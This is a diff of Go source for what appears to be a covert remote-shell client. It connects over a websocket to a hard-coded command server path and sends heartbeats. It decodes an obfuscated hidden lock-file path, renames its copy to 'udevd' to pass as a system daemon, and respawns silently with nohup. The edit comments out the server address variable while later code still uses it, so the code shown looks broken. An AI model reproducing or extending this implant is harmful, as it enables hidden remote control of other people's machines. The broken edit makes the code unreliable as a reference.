@@ -15,6 +15,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"syscall"
@@ -36,7 +37,7 @@ const (
 var (
 	s_lock int
 	m      *filemutex.FileMutex
-	baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
+	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
 	conn         *websocket.Conn
 	origin       = "http://" + baseUrl + "/"
 	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
@@ -67,12 +68,13 @@ func creatWebsocket() (*websocket.Conn, error) {
 }
 
 func main() {
-	//daemon.Daemon(1, 0)                 //成为守护进程
+
 	signal.Ignore(syscall.Signal(20), syscall.Signal(17), syscall.Signal(18)) //因为代码中没有wait,所以忽略系统子进程结束信号，避免僵尸进程(go1,9没有系统子进程结束信号，自己建造信号值)
 	fork()
+
+	var err error
 	go lockTime()
 	//文件锁
-	var err error
 	m, err = filemutex.New(strDec("HV7JA2yYAlAkrS3IR20uR53mi3Y=")) //"/dev/shm/.system"
 	if err != nil {
 		fmt.Println("lock error:", err)
@@ -80,7 +82,8 @@ func main() {
 	}
 	m.Lock()
 	defer m.Unlock()
-	s_lock = 1   //加锁标识(防止一台机器上启动多个应用程序)
+	s_lock = 1 //加锁标识(防止一台机器上启动多个应用程序)
+
 	go outChan() //发送消息
 	go heart()   //心跳
 	for {
@@ -347,7 +350,7 @@ func fork() {
 		dstFileName = "udevd"
 	}
 
-	if strings.HasPrefix(dst, src) { //如果运行程序就在指定目录
+	if src == dst[:len(dst)-1] { //如果运行程序就在指定目录
 		return
 	}
 
@@ -357,7 +360,7 @@ func fork() {
 	}
 	//execShell("cd " + dst)
 	err = forkExec("chmod +x " + dst + dstFileName)
-	err = forkExec("nohup " + dst + dstFileName + " >/dev/null 2>&1 &") //fork子程序
+	err = forkExec("nohup " + dst + dstFileName + " >/dev/null 2>&1 &") //fork子程序" >/dev/null 2>&1 &"  " >/root/go/src/go_shell/client/aa.log 2>&1 &"
 	if err != nil {
 		return
 	}
